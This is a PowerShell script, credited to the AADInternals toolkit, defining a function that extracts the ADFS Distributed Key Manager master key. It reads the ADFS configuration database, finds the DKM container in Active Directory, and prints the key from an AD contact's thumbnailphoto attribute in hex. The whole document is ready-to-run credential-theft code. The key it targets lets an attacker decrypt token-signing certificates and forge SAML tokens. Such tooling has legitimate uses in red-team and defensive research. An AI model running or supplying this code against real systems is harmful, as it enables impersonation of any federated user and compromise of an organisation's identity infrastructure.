# Reference:
# https://www.powershellgallery.com/packages/AADInternals/0.4.4/Content/ADFS_utils.ps1

function Export-ADFSDkmPrivateKey
{
    # Check that we are on ADFS server
    if(!(Get-Service ADFSSRV -ErrorAction SilentlyContinue))
    {
        Write-Error "This command needs to be run on ADFS server"
        return
    }

    # Get the database connection string
    $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
    $conn = $ADFS.ConfigurationDatabaseConnectionString
    Write-Verbose "ConnectionString: $conn"

    # Read the service settings from the database
    $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
    $SQLclient.Open()
    $SQLcmd = $SQLclient.CreateCommand()
    $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"
    $SQLreader = $SQLcmd.ExecuteReader()
    $SQLreader.Read() | Out-Null
    $settings=$SQLreader.GetTextReader(0).ReadToEnd()
    $SQLreader.Dispose()

    # Read the XML
    [xml]$xml=$settings

    # Get DKM container info
    $group=$xml.ServiceSettingsData.PolicyStore.DkmSettings.Group
    $container=$xml.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
    $parent=$xml.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
    $base="CN=$group,$container,$parent"

    # Read the encryption key from AD object
    $ADSearch = New-Object System.DirectoryServices.DirectorySearcher
    $ADSearch.SearchRoot = "LDAP://$base"
    $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null
    $ADSearch.Filter='(&(objectclass=contact)(!name=CryptoPolicy))'
    $ADUser=$ADSearch.FindOne() 
    $key=[byte[]]$aduser.Properties["thumbnailphoto"][0] 
    Write-Verbose "Key:"
    Write-Verbose "$($key|Format-Hex)"

    Write-Host "[+] Private Key Hex (Dash):" ([System.BitConverter]::ToString($key))
    Write-Host "[+] Private Key Hex (No Dash):" ([System.BitConverter]::ToString($key) | Out-String).Replace("-", "")
}